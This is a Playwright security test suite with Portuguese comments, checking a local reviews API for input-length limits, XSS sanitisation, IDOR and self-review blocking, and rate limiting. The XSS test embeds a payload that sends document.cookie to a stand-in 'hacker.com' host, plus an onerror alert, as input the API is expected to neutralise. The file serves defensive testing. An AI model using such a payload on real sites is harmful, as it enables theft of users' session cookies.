import { test, expect } from '@playwright/test';

// Utilizando Playwright para Pentest TDD da API
// Executar: npx playwright test e2e/api.reviews.spec.ts

test.describe('Pentest: Reviews API (Zero-Trust & AppSec)', () => {

  const BASE_URL = 'http://localhost:3000/api/v1';

  test('Abuse: Hard Limits Enforcement - Estouro de Comentário (>300 chars)', async ({ request }) => {
    // Payload malicioso com 5000 caracteres
    const giantString = 'A'.repeat(5000);

    const response = await request.post(`${BASE_URL}/reviews`, {
      data: {
        target_id: 2,
        rating: 5,
        comment: giantString
      },
      // Headers simulariam uma sessão Auth0 válida aqui para o user 1
      headers: { 'Authorization': 'Bearer TEST_TOKEN_USER_1' } 
    });

    // Como o Zod e o SQLite têm limites estritos de 300 chars, tem que falhar no backend
    expect(response.status()).toBe(400);
    const body = await response.json();
    expect(body.error).toContain('limit'); // Mensagem apropriada do Zod
  });

  test('Abuse: XSS Injection - Neutralização de Payload', async ({ request }) => {
    // Envio de payload XSS clássico
    const xssPayload = `<script>fetch('hacker.com?c='+document.cookie)</script><img src=x onerror=alert(1)> Bom vendedor!`;

    const response = await request.post(`${BASE_URL}/reviews`, {
      data: {
        target_id: 2,
        rating: 4,
        comment: xssPayload
      },
      headers: { 'Authorization': 'Bearer TEST_TOKEN_USER_1' }
    });

    // Poderíamos rejeitar com 400 ou higienizar e aceitar. Se higienizarmos:
    expect(response.status()).toBe(201); // Assumindo que criamos mas sanitizamos
    const body = await response.json();
    
    // O comentário resultante NA BASE DE DADOS não deve conter XSS.
    expect(body.comment).not.toContain('<script>');
    expect(body.comment).not.toContain('onerror');
    // Deve ser apenas "Bom vendedor!" ou tags html seguras (se usarmos isomorphic-dompurify)
  });

  test('Abuse: IDOR - Auto-avaliação (Verificação de Lógica de Negócio)', async ({ request }) => {
    // Utilizador 1 tenta avaliar o próprio Utilizador 1
    const response = await request.post(`${BASE_URL}/reviews`, {
      data: {
        target_id: 1, // Target igual ao reviewer
        rating: 5,
        comment: 'Eu sou incrível.'
      },
      headers: { 'Authorization': 'Bearer TEST_TOKEN_USER_1' }
    });

    // Zero-Trust: A base de dados / API deve rejeitar (403 ou 400)
    expect([400, 403]).toContain(response.status());
  });

  test('Abuse: IDOR - Alterar Avaliação de Terceiros', async ({ request }) => {
    // O utilizador 1 tenta fazer PUT/PATCH numa review que pertence ao utilizador 2
    const reviewIdDoUser2 = 99; // ID de uma review que não nos pertence

    const response = await request.put(`${BASE_URL}/reviews/${reviewIdDoUser2}`, {
      data: {
        rating: 1,
        comment: 'Mudei isto maliciosamente'
      },
      headers: { 'Authorization': 'Bearer TEST_TOKEN_USER_1' } // O token é do User 1
    });

    // Tem de ser bloqueado imediatamente
    if (response.status() === 500) {
      console.log('500 Error Body:', await response.text());
    }
    expect([403, 404]).toContain(response.status());
  });

  test('Abuse: Context Violation - Avaliar sem Negotiation concluída', async ({ request }) => {
    // Tentar avaliar o user 3 com quem não fizemos negócios
    const response = await request.post(`${BASE_URL}/reviews`, {
      data: {
        target_id: 3,
        rating: 5,
        comment: 'Ótimo serviço!'
      },
      headers: { 'Authorization': 'Bearer TEST_TOKEN_USER_1' }
    });

    // Requerimentos de negócio dizem que é proibido
    expect(response.status()).toBe(403);
  });

  test('Abuse: Rate Limit - Proteção contra DDoS e Brute Force', async ({ request }) => {
    // Disparar uma rajada de requisições super rápida (ex: 50 requests)
    const requests = Array.from({ length: 50 }).map(() =>
      request.get(`${BASE_URL}/reviews`, {
        headers: { 'Authorization': 'Bearer TEST_TOKEN_USER_1' }
      })
    );

    const responses = await Promise.all(requests);
    
    // Pelo menos algumas das últimas devem ser bloqueadas com 429 Too Many Requests
    const statuses = responses.map(r => r.status());
    expect(statuses).toContain(429);
  });

});
